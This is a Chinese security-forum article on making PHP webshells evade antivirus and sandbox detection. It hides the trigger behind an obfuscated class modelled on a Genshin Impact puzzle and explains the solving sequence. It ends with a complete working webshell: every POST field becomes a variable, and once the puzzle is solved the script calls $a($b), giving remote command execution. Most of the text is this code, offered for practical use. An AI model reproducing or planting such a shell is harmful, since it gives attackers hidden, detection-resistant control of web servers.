---
title: 使用分支对抗进行webshell bypass
url: https://forum.butian.net/share/4134
source: 奇安信攻防社区
date: 2025-02-15
fetch_date: 2025-10-06T20:32:29.543063
---

# 使用分支对抗进行webshell bypass

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 使用分支对抗进行webshell bypass

使用分支对抗进行webshell bypass

前言
==
对于webshell免杀来说，类绕过是最有效果且不易被检测出来的，那如果我们对类进行操作，在类里面加入一些算法和混淆代码，让代码逻辑变得十分混乱，不易读，甚至读不懂，但是却能够执行命令，可以rce，那岂不是可以bypass所有的杀毒软件和云沙箱了吗？
利用稻妻雷元素方块阵
==========
《原神》中的稻妻雷元素方块阵是一个解谜游戏
下面是示例代码：
```php
class InazumaPuzzle {
private $blockA = 0;
private $blockB = 0;
private $blockC = 0;
private $blockD = 0;
private $MAX\_ENUM = 2;
private $MIN\_ENUM = 0;
public function \_\_construct() {
$this->blockA = 2;
$this->blockB = 0;
$this->blockC = 0;
$this->blockD = 2;
}
private function setBackBlock($block) {
$setType = $this->MIN\_ENUM;
$maxType = $this->MAX\_ENUM;
switch ($block) {
case 'A':
if ($this->blockA == $maxType) {
$this->blockA = $setType;
return true;
} else {
return false;
}
case 'B':
if ($this->blockB == $maxType) {
$this->blockB = $setType;
return true;
} else {
return false;
}
case 'C':
if ($this->blockC == $maxType) {
$this->blockC = $setType;
return true;
} else {
return false;
}
case 'D':
if ($this->blockD == $maxType) {
$this->blockD = $setType;
return true;
} else {
return false;
}
default:
throw new Exception("bad\_args", 1);
}
}
private function hit($blockIdx) {
global $text;
$text = urldecode("%6e%69%6c%72%65%70%5f%46%46%49%44");
switch ($blockIdx) {
case "A":
if (!$this->setBackBlock("A")) {
$this->blockA += 1;
}
if (!$this->setBackBlock("B")) {
$this->blockB += 1;
}
break;
case "B":
if (!$this->setBackBlock("A")) {
$this->blockA += 1;
}
if (!$this->setBackBlock("B")) {
$this->blockB += 1;
}
if (!$this->setBackBlock("C")) {
$this->blockC += 1;
}
break;
case "C":
if (!$this->setBackBlock("B")) {
$this->blockB += 1;
}
if (!$this->setBackBlock("C")) {
$this->blockC += 1;
}
if (!$this->setBackBlock("D")) {
$this->blockD += 1;
}
break;
case "D":
if (!$this->setBackBlock("C")) {
$this->blockC += 1;
}
if (!$this->setBackBlock("D")) {
$this->blockD += 1;
}
break;
default:
throw new Exception("bad\_args", 1);
}
}
public function \_\_AFG50CE4\_RG1() {
global $puzz\_writeup;
if (count($puzz\_writeup) === 0) throw new Exception("Invalid WriteUP",1);for ($i = 0; $i < count($puzz\_writeup);
// bcdufvcf%00
$i++) {
if (strcmp($puzz\_writeup[$i],"A") !== 0 and strcmp($puzz\_writeup[$i],"B") !== 0 and strcmp($puzz\_writeup[$i]
,"C") !== 0 and strcmp($puzz\_writeup[$i],"D") !== 0) die("笨蛋笨蛋笨蛋笨蛋！！~ 都...都跟你说了答案里只能有ABCD的......");
}
for ($i = 0; $i < count($puzz\_writeup); $i++) $this -> hit($puzz\_writeup[$i]);
global $userans;
$userans =$this ->blockA + $this-> blockB + $this -> blockC+ $this -> blockD;
}
public function getLockerStatus() {
global $text;$text =strrev($text);
if ($this -> blockA ===$this -> blockB and $this -> blockA === $this -> blockC and $this -> blockA === $this -> blockD) return true;
else return false;
}
}
function pause($obj) {
global $appor5nnb;
if (!$appor5nnb -> getLockerStatus()) die();
return $obj;
}
```
根据InazumaPuzzle类的构造函数，方块的初始状态如下：
```php
blockA = 2
blockB = 0
blockC = 0
blockD = 2
```
每个方块的状态值可以循环从0到2（即最小值为0，最大值为2）。
setBackBlock() 方法的作用
```php
setBackBlock()方法用于尝试将指定方块重置为其最小状态（即0）。如果该方块已经处于最大状态（即2），则它可以被重置为最小状态并返回true；否则它不会改变，并返回false。
```
hit() 方法的行为
```php
hit()方法接受一个方块标识符（如"A"、"B"、"C"或"D"），然后执行以下操作：
对于点击的方块及其关联的方块调用setBackBlock()。
如果setBackBlock()返回false，则相应方块的状态加1。
```
具体来说：
```php
点击A：尝试重置A和B，若不能重置，则它们各自加1。
点击B：尝试重置A、B和C，若不能重置，则它们各自加1。
点击C：尝试重置B、C和D，若不能重置，则它们各自加1。
点击D：尝试重置C和D，若不能重置，则它们各自加1。
```
解析输入序列 ABBCCD
现在我们来按照给定的输入序列ABBCCD一步一步地看每个点击对方块状态的影响：
第一步：点击 A
```php
尝试重置A（当前状态为2），成功重置为0。
尝试重置B（当前状态为0），失败，因此B变为1。
结果：blockA = 0, blockB = 1, blockC = 0, blockD = 2
```
第二步：点击 B
```php
尝试重置A（当前状态为0），失败，因此A变为1。
尝试重置B（当前状态为1），失败，因此B变为2。
尝试重置C（当前状态为0），失败，因此C变为1。
结果：blockA = 1, blockB = 2, blockC = 1, blockD = 2
```
第三步：再次点击 B
```php
尝试重置A（当前状态为1），失败，因此A变为2。
尝试重置B（当前状态为2），成功重置为0。
尝试重置C（当前状态为1），失败，因此C变为2。
结果：blockA = 2, blockB = 0, blockC = 2, blockD = 2
```
第四步：点击 C
```php
尝试重置B（当前状态为0），失败，因此B变为1。
尝试重置C（当前状态为2），成功重置为0。
尝试重置D（当前状态为2），成功重置为0。
结果：blockA = 2, blockB = 1, blockC = 0, blockD = 0
```
第五步：再次点击 C
```php
尝试重置B（当前状态为1），失败，因此B变为2。
尝试重置C（当前状态为0），失败，因此C变为1。
尝试重置D（当前状态为0），失败，因此D变为1。
结果：blockA = 2, blockB = 2, blockC = 1, blockD = 1
```
第六步：点击 D
```php
尝试重置C（当前状态为1），失败，因此C变为2。
尝试重置D（当前状态为1），失败，因此D变为2。
结果：blockA = 2, blockB = 2, blockC = 2, blockD = 2
```
最终，所有方块的状态都变成了2，满足了getLockerStatus()方法中的条件，即所有方块的状态相同，因此返回true，表示谜题被正确解开。
结合稻妻雷元素方块阵的webshell
===================
```php
<?php
error\_reporting(0);
header("Content-type:text/html;charset=utf-8");
foreach($\_POST as $key => $value) $$key = $value;
if (strlen($wpstring) === 0) die("笨蛋！先启动原神解个稻妻雷元素方块阵再来吧！");
$puzz\_writeup = array();
for ($i = 0; $i < strlen($wpstring); $i++) array\_push($puzz\_writeup, $wpstring[$i]);
class InazumaPuzzle {
private $blockA = 0;
private $blockB = 0;
private $blockC = 0;
private $blockD = 0;
private $MAX\_ENUM = 2;
private $MIN\_ENUM = 0;
public function \_\_construct() {
$this->blockA = 2;
$this->blockB = 0;
$this->blockC = 0;
$this->blockD = 2;
}
private function setBackBlock($block) {
$setType = $this->MIN\_ENUM;
$maxType = $this->MAX\_ENUM;
switch ($block) {
case 'A':
if ($this->blockA == $maxType) {
$this->blockA = $setType;
return true;
} else {
return false;
}
case 'B':
if ($this->blockB == $maxType) {
$this->blockB = $setType;
return true;
} else {
return false;
}
case 'C':
if ($this->blockC == $maxType) {
$this->blockC = $setType;
return true;
} else {
return false;
}
case 'D':
if ($this->blockD == $maxType) {
$this->blockD = $setType;
return true;
} else {
return false;
}
default:
throw new Exception("bad\_args", 1);
}
}
private function hit($blockIdx) {
global $text;
$text = urldecode("%6e%69%6c%72%65%70%5f%46%46%49%44");
switch ($blockIdx) {
case "A":
if (!$this->setBackBlock("A")) {
$this->blockA += 1;
}
if (!$this->setBackBlock("B")) {
$this->blockB += 1;
}
break;
case "B":
if (!$this->setBackBlock("A")) {
$this->blockA += 1;
}
if (!$this->setBackBlock("B")) {
$this->blockB += 1;
}
if (!$this->setBackBlock("C")) {
$this->blockC += 1;
}
break;
case "C":
if (!$this->setBackBlock("B")) {
$this->blockB += 1;
}
if (!$this->setBackBlock("C")) {
$this->blockC += 1;
}
if (!$this->setBackBlock("D")) {
$this->blockD += 1;
}
break;
case "D":
if (!$this->setBackBlock("C")) {
$this->blockC += 1;
}
if (!$this->setBackBlock("D")) {
$this->blockD += 1;
}
break;
default:
throw new Exception("bad\_args", 1);
}
}
public function \_\_AFG50CE4\_RG1() {
global $puzz\_writeup;
if (count($puzz\_writeup) === 0) throw new Exception("Invalid WriteUP",1);for ($i = 0; $i < count($puzz\_writeup);$i++) {
if (strcmp($puzz\_writeup[$i],"A") !== 0 and strcmp($puzz\_writeup[$i],"B") !== 0 and strcmp($puzz\_writeup[$i],"C") !== 0 and strcmp($puzz\_writeup[$i],"D") !== 0) die("笨蛋笨蛋笨蛋笨蛋！！~ 都...都跟你说了答案里只能有ABCD的......");
}
for ($i = 0; $i < count($puzz\_writeup); $i++) $this -> hit($puzz\_writeup[$i]);
global $userans;
$userans =$this ->blockA + $this-> blockB + $this -> blockC+ $this -> blockD;
}
public function getLockerStatus() {
global $text;$text =strrev($text);
if ($this -> blockA ===$this -> blockB and $this -> blockA === $this -> blockC and $this -> blockA === $this -> blockD) return true;
else return false;
}
}
function pause($obj) {
global $appor5nnb;
if (!$appor5nnb -> getLockerStatus()) die();
return $obj;
}
$appor5nnb = new InazumaPuzzle();
$appor5nnb -> \_\_AFG50CE4\_RG1();
if ($appor5nnb -> getLockerStatus()) $a($b);
```
payload...